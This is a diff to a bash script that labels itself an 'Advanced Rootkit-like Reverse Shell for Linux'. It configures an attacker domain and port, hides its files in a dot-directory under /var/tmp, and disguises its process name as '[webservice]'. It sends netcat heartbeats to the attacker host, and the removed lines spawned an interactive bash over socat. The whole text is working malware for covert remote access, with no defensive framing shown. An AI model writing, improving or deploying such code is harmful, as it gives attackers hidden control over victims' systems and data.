@@ -1,4 +1,3 @@
-
 #!/bin/bash
 
 # Advanced Rootkit-like Reverse Shell for Linux
@@ -12,8 +11,7 @@ fi
 
 # Configuration
 ATTACKER_IP="botconnect.ddns.net"  # Replace with your attacker's IP/domain
-PORT=4444  # Port for reverse shell
-HEARTBEAT_PORT=4445  # Separate port for heartbeat
+PORT=4444  # Port for reverse shell and server
 HIDDEN_DIR="/var/tmp/.webservice"  # Hidden directory
 HIDDEN_FILE="$HIDDEN_DIR/webservice.sh"  # Hidden file
 PROCESS_NAME="[webservice]"  # Process name to mimic
@@ -200,22 +198,13 @@ Uptime: $(uptime)"
     esac
 }
 
-# Heartbeat function (runs on separate connection)
+# Heartbeat function
 send_heartbeat() {
     while true; do
         sleep 5
-        echo "KEEPALIVE:$UUID" | nc -w 1 $ATTACKER_IP $HEARTBEAT_PORT 2>/dev/null
+        echo "KEEPALIVE:$UUID" | nc -w 1 $ATTACKER_IP $PORT 2>/dev/null
     done
 }
-
-# Check for PTY tools and set command
-if command -v socat >/dev/null 2>&1; then
-    PTY_CMD="socat -u EXEC:'/bin/bash -i',pty,stderr,setsid"
-elif command -v script >/dev/null 2>&1; then
-    PTY_CMD="script -q -c '/bin/bash -i' /dev/null"
-else
-    PTY_CMD="/bin/bash -i"
-fi
 
 # Single connection for messages and shell
 while true; do
